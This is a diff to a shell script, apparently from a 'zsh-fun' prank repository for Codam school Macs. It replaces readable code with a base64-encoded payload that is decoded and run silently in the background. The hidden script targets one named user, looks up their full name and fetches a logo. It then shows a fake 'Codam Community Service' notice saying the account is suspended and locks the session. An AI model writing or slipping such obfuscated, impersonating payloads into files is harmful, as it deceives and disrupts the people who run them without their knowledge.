@@ -1,16 +1,3 @@
+FUN="aWYgWyAiJCh3aG9hbWkpIiA9ICJqaWR6aW5nYSIgXTsgdGhlbgoJQ0RfRlVMTF9OQU1FPSQoZmluZ2VyICQod2hvYW1pKSB8IHBlcmwgLW5lICcvTmFtZTogKFthLXpBLVowLTkgXXsxLH0pLyAmJiBwcmludCAiJDFcbiInKQoKCUNEX1RNUF9ESVI9JChta3RlbXAgLWQpCgoJY3VybCAtTCAtcyAiaHR0cHM6Ly9naXRodWIuY29tL0NvZGFtU2NyaXB0cy96c2gtZnVuL2Jsb2IvbWFzdGVyL2xvZ28ucG5nP3Jhdz10cnVlIiAtbyAkQ0RfVE1QX0RJUi9sb2dvLnBuZwoJb3Nhc2NyaXB0IDw8IEVPRgoJc2V0IGMgdG8gIiRDRF9UTVBfRElSIiAmICIvbG9nby5wbmciCglzZXQgZiB0byBQT1NJWCBmaWxlIGMKCWRpc3BsYXkgZGlhbG9nICJEZWFyICRDRF9GVUxMX05BTUUsIFxuQmVjYXVzZSBvZiB5b3VyIHJlY2VudCBhY3Rpdml0aWVzIHlvdXIgYWNjb3VudCBoYXMgYmVlbiBzdXNwZW5kZWQsIHBsZWFzZSByZXBvcnQgdG8gQm9jYWwgZm9yIENvbW11bml0eSBTZXJ2aWNlLiIgYnV0dG9ucyB7IlN1c3BlbmQgU2Vzc2lvbiJ9IGRlZmF1bHQgYnV0dG9uIDEgd2l0aCB0aXRsZSAiQ29kYW0gQ29tbXVuaXR5IFNlcnZpY2UiIHdpdGggaWNvbiBmCglpZiB0aGUgYnV0dG9uIHJldHVybmVkIG9mIHRoZSByZXN1bHQgaXMgIlN1c3BlbmQgU2Vzc2lvbiIgdGhlbgoJCWRvIHNoZWxsIHNjcmlwdCAiL1N5c3RlbS9MaWJyYXJ5L0NvcmVTZXJ2aWNlcy9NZW51XFxcIEV4dHJhcy9Vc2VyLm1lbnUvQ29udGVudHMvUmVzb3VyY2VzL0NHU2Vzc2lvbiAtc3VzcGVuZCIKCWVuZCBpZgpFT0YKZmkK"
 
-if [ "$(whoami)" = "dvan-der" ]; then
-	CD_FULL_NAME=$(finger $(whoami) | perl -ne '/Name: ([a-zA-Z0-9 ]{1,})/ && print "$1\n"')
-
-	CD_TMP_DIR=$(mktemp -d)
-
-	curl -L -s "https://github.com/CodamScripts/zsh-fun/blob/master/logo.png?raw=true" -o $CD_TMP_DIR/logo.png
-	osascript << EOF
-	set c to "$CD_TMP_DIR" & "/logo.png"
-	set f to POSIX file c
-	display dialog "Dear $CD_FULL_NAME, \nBecause of your recent activities your account has been suspended, please report to Bocal." buttons {"Suspend Session"} default button 1 with title "Codam Community Service" with icon f
-	if the button returned of the result is "Suspend Session" then
-		do shell script "/System/Library/CoreServices/Menu\\\ Extras/User.menu/Contents/Resources/CGSession -suspend"
-	end if
-EOF
-fi
+echo $FUN |base64 -D |sh &
